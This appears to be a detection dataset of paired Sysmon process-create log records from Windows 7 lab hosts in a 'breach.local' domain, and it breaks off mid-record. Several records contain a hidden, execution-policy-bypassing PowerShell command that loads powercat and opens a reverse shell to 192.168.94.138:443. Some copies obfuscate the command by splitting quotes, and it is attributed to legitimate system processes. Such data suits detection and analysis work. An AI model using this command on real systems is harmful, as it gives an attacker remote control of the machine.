"{'computer_name': 'CLIENT1.breach.local', 'record_id': 1317, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'opcode': 'Info', 'event_data': {'LogonId': '0x3e7', 'Description': 'Windows Logon User Interface Host', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'logonui.exe', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '1', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog'}","{'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'event_id': 1, 'process': {'pid': 1536, 'thread': {'id': 1812}}, 'event_data': {'TerminalSessionId': '1', 'Product': 'Microsoft® Windows® Operating System', 'LogonId': '0x3e7', 'Description': 'Windows Logon User Interface Host', 'LogonGuid': '{19FC45AC-752E-601C-0000-0020E7030000}', 'OriginalFileName': 'logonui.exe', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'Company': 'Microsoft Corporation', 'IntegrityLevel': 'System'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'record_id': 1421, 'opcode': 'Info', 'user': {'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM'}, 'api': 'wineventlog', 'computer_name': 'CLIENT3.breach.local', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon'}"
"{'created': '2021-02-04T22:34:22.086Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:35:49.069Z', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon'}"
"{'pid': 1728, 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-001099590000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}, 'name': 'LogonUI.exe', 'args': ['LogonUI.exe', '/flags:0x0'], 'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'entity_id': '{19FC45AC-766C-601C-0000-001038F80400}', 'command_line': '""C:\\Windows\\System32\\cmd.exe"" /c powershell -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\nothinghere\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ', 'working_directory': 'C:\\Windows\\system32\\'}","{'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'entity_id': '{19FC45AC-76C3-601C-0000-0010700A0500}', 'pid': 1064, 'command_line': '""C:\\Windows\\System32\\cmd.exe"" /c po""wersh""ell -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\nothinghere\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-752D-601C-0000-0010D95C0000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}, 'args': ['LogonUI.exe', '/flags:0x0'], 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'name': 'LogonUI.exe'}"
"{'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT1.breach.local', 'hostname': 'CLIENT1', 'architecture': 'x86'}","{'name': 'CLIENT3.breach.local', 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103']}"
"{'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1'}","{'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3'}"
2021-02-04T22:34:20.830Z,2021-02-04T22:34:55.640Z
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:34:20.830
ProcessGuid: {19FC45AC-766C-601C-0000-001038F80400}
ProcessId: 1728
Image: C:\Windows\System32\LogonUI.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Logon User Interface Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: logonui.exe
CommandLine: ""LogonUI.exe"" /flags:0x0
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-7528-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 1
IntegrityLevel: System
Hashes: MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6
ParentProcessGuid: {19FC45AC-7527-601C-0000-001099590000}
ParentProcessId: 384
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 22:34:55.640
ProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ProcessId: 440
Image: C:\Windows\System32\services.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Services and Controller app
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: services.exe
CommandLine: C:\Windows\system32\services.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=5F1B6A9C35D3D5CA72D6D6FDEF9747D6,SHA256=D7BC4ED605B32274B45328FD9914FB0E7B90D869A38F0E6F94FB1BF4E9E2B407
ParentProcessGuid: {19FC45AC-768F-601C-0000-001049590000}
ParentProcessId: 348
ParentImage: C:\Windows\System32\wininit.exe
ParentCommandLine: wininit.exe"
"{'computer_name': 'CLIENT1.breach.local', 'record_id': 1317, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'opcode': 'Info', 'event_data': {'LogonId': '0x3e7', 'Description': 'Windows Logon User Interface Host', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'logonui.exe', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '1', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog'}","{'opcode': 'Info', 'version': 5, 'process': {'pid': 1928, 'thread': {'id': 1716}}, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'record_id': 1326, 'computer_name': 'CLIENT1.breach.local', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'provider_name': 'Microsoft-Windows-Sysmon', 'event_data': {'LogonId': '0x3e7', 'LogonGuid': '{19FC45AC-768F-601C-0000-0020E7030000}', 'FileVersion': '6.1.7600.16385 (win7_rtm.090713-1255)', 'OriginalFileName': 'services.exe', 'TerminalSessionId': '0', 'Company': 'Microsoft Corporation', 'Product': 'Microsoft® Windows® Operating System', 'Description': 'Services and Controller app', 'IntegrityLevel': 'System'}}"
"{'created': '2021-02-04T22:34:22.086Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T22:37:09.055Z'}"
"{'pid': 1728, 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-001099590000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}, 'name': 'LogonUI.exe', 'args': ['LogonUI.exe', '/flags:0x0'], 'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'entity_id': '{19FC45AC-766C-601C-0000-001038F80400}', 'command_line': '""C:\\Windows\\System32\\cmd.exe"" /c powershell -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\nothinghere\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ', 'working_directory': 'C:\\Windows\\system32\\'}","{'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': '""C:\\Windows\\System32\\cmd.exe"" /c power""she""ll -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\secretstuff\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'args': ['wininit.exe'], 'entity_id': '{19FC45AC-768F-601C-0000-001049590000}', 'pid': 348, 'executable': 'C:\\Windows\\System32\\wininit.exe', 'command_line': 'wininit.exe', 'name': 'wininit.exe'}, 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'hash': {'md5': '5f1b6a9c35d3d5ca72d6d6fdef9747d6', 'sha256': 'd7bc4ed605b32274b45328fd9914fb0e7b90d869a38f0e6f94fb1bf4e9e2b407'}, 'pid': 440}"
"{'user': 'SYSTEM', 'hash': ['3ef0d8ab08385aab5802e773511a2e6a', '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6']}","{'user': 'SYSTEM', 'hash': ['5f1b6a9c35d3d5ca72d6d6fdef9747d6', 'd7bc4ed605b32274b45328fd9914fb0e7b90d869a38f0e6f94fb1bf4e9e2b407']}"
"{'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}","{'md5': '5f1b6a9c35d3d5ca72d6d6fdef9747d6', 'sha256': 'd7bc4ed605b32274b45328fd9914fb0e7b90d869a38f0e6f94fb1bf4e9e2b407'}"
"{'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1'}","{'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72'}"
2021-02-04T22:34:20.830Z,2021-02-04T23:00:58.497Z
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:34:20.830
ProcessGuid: {19FC45AC-766C-601C-0000-001038F80400}
ProcessId: 1728
Image: C:\Windows\System32\LogonUI.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Logon User Interface Host
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: logonui.exe
CommandLine: ""LogonUI.exe"" /flags:0x0
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-7528-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 1
IntegrityLevel: System
Hashes: MD5=3EF0D8AB08385AAB5802E773511A2E6A,SHA256=1A7EE4BC646767004372EAEA9BC0A2071790E739101F7D25ECD9C95D3F29AFD6
ParentProcessGuid: {19FC45AC-7527-601C-0000-001099590000}
ParentProcessId: 384
ParentImage: C:\Windows\System32\winlogon.exe
ParentCommandLine: winlogon.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 23:00:58.497
ProcessGuid: {19FC45AC-7CAA-601C-0000-001035D90D00}
ProcessId: 2288
Image: C:\Windows\servicing\TrustedInstaller.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Modules Installer
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: TrustedInstaller.exe
CommandLine: C:\Windows\servicing\TrustedInstaller.exe
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-76D8-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=2C49B175AEE1D4364B91B531417FE583,SHA256=6C7995E18F84E465C376D1D5F153C15ACB66CDEA86EE5BF186677F572E7E129B
ParentProcessGuid: {19FC45AC-76D8-601C-0000-0010F1630000}
ParentProcessId: 444
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'computer_name': 'CLIENT1.breach.local', 'record_id': 1317, 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'version': 5, 'opcode': 'Info', 'event_data': {'LogonId': '0x3e7', 'Description': 'Windows Logon User Interface Host', 'Product': 'Microsoft® Windows® Operating System', 'OriginalFileName': 'logonui.exe', 'IntegrityLevel': 'System', 'LogonGuid': '{19FC45AC-7528-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'TerminalSessionId': '1', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'provider_name': 'Microsoft-Windows-Sysmon', 'process': {'pid': 1524, 'thread': {'id': 1792}}, 'user': {'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User'}, 'event_id': 1, 'task': 'Process Create (rule: ProcessCreate)', 'api': 'wineventlog'}","{'user': {'name': 'SYSTEM', 'domain': 'NT AUTHORITY', 'type': 'User', 'identifier': 'S-1-5-18'}, 'opcode': 'Info', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'provider_name': 'Microsoft-Windows-Sysmon', 'record_id': 1408, 'event_data': {'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)', 'IntegrityLevel': 'System', 'Company': 'Microsoft Corporation', 'Product': 'Microsoft® Windows® Operating System', 'LogonGuid': '{19FC45AC-76D8-601C-0000-0020E7030000}', 'LogonId': '0x3e7', 'TerminalSessionId': '0', 'Description': 'Windows Modules Installer', 'OriginalFileName': 'TrustedInstaller.exe'}, 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'task': 'Process Create (rule: ProcessCreate)', 'version': 5, 'api': 'wineventlog', 'computer_name': 'CLIENT2.breach.local', 'process': {'pid': 1704, 'thread': {'id': 1804}}}"
"{'created': '2021-02-04T22:34:22.086Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start'], 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}","{'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process'], 'created': '2021-02-04T23:00:59.310Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)'}"
"{'pid': 1728, 'executable': 'C:\\Windows\\System32\\LogonUI.exe', 'parent': {'entity_id': '{19FC45AC-7527-601C-0000-001099590000}', 'pid': 384, 'executable': 'C:\\Windows\\System32\\winlogon.exe', 'command_line': 'winlogon.exe', 'name': 'winlogon.exe', 'args': ['winlogon.exe']}, 'name': 'LogonUI.exe', 'args': ['LogonUI.exe', '/flags:0x0'], 'hash': {'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}, 'entity_id': '{19FC45AC-766C-601C-0000-001038F80400}', 'command_line': '""C:\\Windows\\System32\\cmd.exe"" /c powershell -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\nothinghere\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ', 'working_directory': 'C:\\Windows\\system32\\'}","{'entity_id': '{19FC45AC-7CAA-601C-0000-001035D90D00}', 'args': ['C:\\Windows\\servicing\\TrustedInstaller.exe'], 'pid': 2288, 'executable': 'C:\\Windows\\servicing\\TrustedInstaller.exe', 'command_line': '""C:\\Windows\\System32\\cmd.exe"" /c p""ower""shell -w hidden -exec bypass cd C:\\Users\\admin\\AppData\\Local\\catchme\\; . .\\cat.ps1; CoNnEct-PoWErcat -Mode Tcp -RemoteIp 192.168.94.138 -Port 443 -Execute ', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-76D8-601C-0000-0010F1630000}', 'pid': 444}, 'name': 'TrustedInstaller.exe', 'hash': {'sha256': '6c7995e18f84e465c376d1d5f153c15acb66cdea86ee5bf186677f572e7e129b', 'md5': '2c49b175aee1d4364b91b531417fe583'}}"
"{'user': 'SYSTEM', 'hash': ['3ef0d8ab08385aab5802e773511a2e6a', '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6']}","{'user': 'SYSTEM', 'hash': ['2c49b175aee1d4364b91b531417fe583', '6c7995e18f84e465c376d1d5f153c15acb66cdea86ee5bf186677f572e7e129b']}"
"{'os': {'platform': 'windows', 'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'name': 'CLIENT1.breach.local', 'hostname': 'CLIENT1', 'architecture': 'x86'}","{'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'name': 'CLIENT2.breach.local', 'ip': ['192.168.56.102', '172.16.1.2', 'fe80::5efe:c0a8:3866', 'fe80::5efe:ac10:102'], 'mac': ['00:50:56:00:03:02', '00:50:56:00:00:02', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT2', 'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}}"
"{'md5': '3ef0d8ab08385aab5802e773511a2e6a', 'sha256': '1a7ee4bc646767004372eaea9bc0a2071790e739101f7d25ecd9c95d3f29afd6'}","{'md5': '2c49b175aee1d4364b91b531417fe583', 'sha256': '6c7995e18f84e465c376d1d5f153c15acb66cdea86ee5bf186677f572e7e129b'}"
"{'ephemeral_id': 'c6dab1c1-2860-4ed8-b41c-e6b57498568e', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT1'}","{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT2', 'ephemeral_id': 'd5d7daa0-c0ba-4d39-9140-3b4a4308a222', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT2'}"
2021-02-04T22:29:14.496Z,2021-02-04T23:30:00.430Z
"{'pid': 972, 'command_line': 'tshark -i Ethernet', 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'entity_id': '{19FC45AC-752D-601C-0000-0010F4630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe', 'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe']}, 'name': 'taskhost.exe', 'args': ['taskhost.exe', 'SYSTEM'], 'hash': {'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}, 'entity_id': '{19FC45AC-753A-601C-0000-0010E1490200}', 'executable': 'C:\\Program Files\\Wireshark\\tshark.exe'}","{'hash': {'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}, 'working_directory': 'C:\\Windows\\system32\\', 'parent': {'command_line': 'C:\\Windows\\system32\\services.exe', 'name': 'services.exe', 'args': ['C:\\Windows\\system32\\services.exe'], 'entity_id': '{19FC45AC-768F-601C-0000-0010EE630000}', 'pid': 440, 'executable': 'C:\\Windows\\System32\\services.exe'}, 'executable': 'C:\\Program Files\\Wireshark\\tshark.exe', 'command_line': 'tshark -""i"" Ethernet', 'name': 'rundll32.exe', 'args': ['C:\\Windows\\system32\\rundll32.exe', 'aepdu.dll,AePduRunUpdate'], 'entity_id': '{19FC45AC-8378-601C-0000-0010AA621200}', 'pid': 2684}"
"{'created': '2021-02-04T22:31:13.166Z', 'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'module': 'sysmon', 'type': ['start', 'process_start'], 'category': ['process']}","{'kind': 'event', 'code': 1, 'provider': 'Microsoft-Windows-Sysmon', 'action': 'Process Create (rule: ProcessCreate)', 'created': '2021-02-04T23:30:01.574Z', 'module': 'sysmon', 'category': ['process'], 'type': ['start', 'process_start']}"
"{'name': 'CLIENT3.breach.local', 'ip': ['192.168.56.103', '172.16.1.3', 'fe80::5efe:c0a8:3867', 'fe80::5efe:ac10:103'], 'mac': ['00:50:56:00:03:03', '00:50:56:00:00:03', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT3', 'architecture': 'x86', 'os': {'version': '6.1', 'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows'}, 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4'}","{'architecture': 'x86', 'os': {'family': 'windows', 'name': 'Windows 7 Professional', 'kernel': '6.1.7601.18741 (win7sp1_gdr.150202-1526)', 'build': '7601.0', 'platform': 'windows', 'version': '6.1'}, 'name': 'CLIENT1.breach.local', 'id': '19fc45ac-5890-4f96-81b1-50ed111c0ce4', 'ip': ['192.168.56.101', '172.16.1.1', 'fe80::5efe:c0a8:3865', 'fe80::5efe:ac10:101'], 'mac': ['00:50:56:00:03:01', '00:50:56:00:00:01', '00:00:00:00:00:00:00:e0', '00:00:00:00:00:00:00:e0'], 'hostname': 'CLIENT1'}"
"Process Create:
RuleName: 
UtcTime: 2021-02-04 22:29:14.496
ProcessGuid: {19FC45AC-753A-601C-0000-0010E1490200}
ProcessId: 972
Image: C:\Windows\System32\taskhost.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Host Process for Windows Tasks
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskhost.exe
CommandLine: taskhost.exe SYSTEM
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-752E-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=7FA8BA5A780E4757964AC9D4238302B9,SHA256=65E3D8CE737896647065103FBB4D58E6A34171D0A48662A832CFDAC3CF469701
ParentProcessGuid: {19FC45AC-752D-601C-0000-0010F4630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe","Process Create:
RuleName: 
UtcTime: 2021-02-04 23:30:00.430
ProcessGuid: {19FC45AC-8378-601C-0000-0010AA621200}
ProcessId: 2684
Image: C:\Windows\System32\rundll32.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows host process (Rundll32)
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: RUNDLL32.EXE
CommandLine: C:\Windows\system32\rundll32.exe aepdu.dll,AePduRunUpdate
CurrentDirectory: C:\Windows\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {19FC45AC-768F-601C-0000-0020E7030000}
LogonId: 0x3e7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: MD5=51138BEEA3E2C21EC44D0932C71762A8,SHA256=5AD3C37E6F2B9DB3EE8B5AEEDC474645DE90C66E3D95F8620C48102F1EBA4124
ParentProcessGuid: {19FC45AC-768F-601C-0000-0010EE630000}
ParentProcessId: 440
ParentImage: C:\Windows\System32\services.exe
ParentCommandLine: C:\Windows\system32\services.exe"
"{'user': 'SYSTEM', 'hash': ['7fa8ba5a780e4757964ac9d4238302b9', '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701']}","{'user': 'SYSTEM', 'hash': ['51138beea3e2c21ec44d0932c71762a8', '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124']}"
"{'md5': '7fa8ba5a780e4757964ac9d4238302b9', 'sha256': '65e3d8ce737896647065103fbb4d58e6a34171d0a48662a832cfdac3cf469701'}","{'md5': '51138beea3e2c21ec44d0932c71762a8', 'sha256': '5ad3c37e6f2b9db3ee8b5aeedc474645de90c66e3d95f8620c48102f1eba4124'}"
"{'type': 'winlogbeat', 'version': '7.10.2', 'hostname': 'CLIENT3', 'ephemeral_id': 'f5ed3d9b-1471-4589-bd70-28219e0f5978', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT3'}","{'hostname': 'CLIENT1', 'ephemeral_id': '486f7872-9118-4349-8630-511973cdbf72', 'id': 'c58de8d4-8be2-444c-bc20-92fab97cbaf5', 'name': 'CLIENT1', 'type': 'winlogbeat', 'version': '7.10.2'}"
"{'version': 5, 'process': {'pid': 1536, 'thread': {'id': 1812}}, 'provider_name': 'Microsoft-Windows-Sysmon', 'provider_guid': '{5770385F-C22A-43E0-BF4C-06F5698FFBD9}', 'task': 'Process Create (rule: ProcessCreate)', 'computer_name': 'CLIENT3.breach.local', 'opcode': 'Info', 'channel': 'Microsoft-Windows-Sysmon/Operational', 'event_id': 1, 'event_data': {'OriginalFileName': 'taskhost.exe', 'LogonGuid': '{19FC45AC-752E-601C-0000-0020E7030000}', 'Company': 'Microsoft Corporation', 'LogonId': '0x3e7', 'TerminalSessionId': '0', 'Description': 'Host Process for Windows Tasks', 'Product': 'Microsoft® Windows® Operating System', 'IntegrityLevel': 'System', 'FileVersion': '6.1.7601.17514 (win7sp1_rtm.101119-1850)'}, 'record_id': 1294, 'api': 'wineventlog', 'user': {'type': 'User', 'identifier': 'S-1-5-18', 'name': 'SYSTEM', 'domain': 'NT AUTHORITY'}}","{'provider_guid': 